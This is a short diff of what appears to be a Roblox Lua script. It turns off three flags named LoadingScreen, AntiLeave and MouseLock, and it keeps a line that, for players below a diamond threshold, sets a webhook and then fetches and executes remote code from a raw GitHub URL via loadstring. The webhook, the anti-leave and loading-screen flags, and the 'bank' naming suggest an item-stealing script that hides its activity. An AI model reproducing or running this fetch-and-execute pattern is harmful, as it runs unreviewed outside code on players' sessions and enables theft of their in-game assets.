@@ -748,9 +748,9 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = true
-    _G.AntiLeave = true
-    _G.MouseLock = true
+    _G.LoadingScreen = false
+    _G.AntiLeave = false
+    _G.MouseLock = false
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NeewGood/bank/main/bankhehe", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
